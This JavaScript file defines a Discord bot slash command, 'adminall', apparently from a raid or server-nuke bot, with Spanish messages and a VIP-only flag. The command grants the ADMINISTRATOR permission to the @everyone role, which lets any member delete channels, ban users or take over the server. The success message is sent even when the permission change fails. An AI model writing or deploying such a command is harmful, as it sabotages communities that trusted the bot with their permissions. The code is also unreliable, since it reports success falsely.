const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {
    vip: true, 
    timeout: 60000,
    data: new SlashCommandBuilder()
    .setName("adminall")
    .setDescription("Dale admin a todos en el servidor. (Only VIP) "),

    async run(client, interaction){
try{
interaction.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
    interaction.reply({content: "**Ocurrió un error al intentar otorgar este permiso al rol @everyone, por favor revise mis permisos.**", ephemeral: true})
})
interaction.reply({content: '**Se le otorgó permiso administrativos a todos en el servidor.**', ephemeral: true})




}catch (e) {
        console.error(e);
    
        try {
          return;
         } catch (e) {}
        }
    }
}
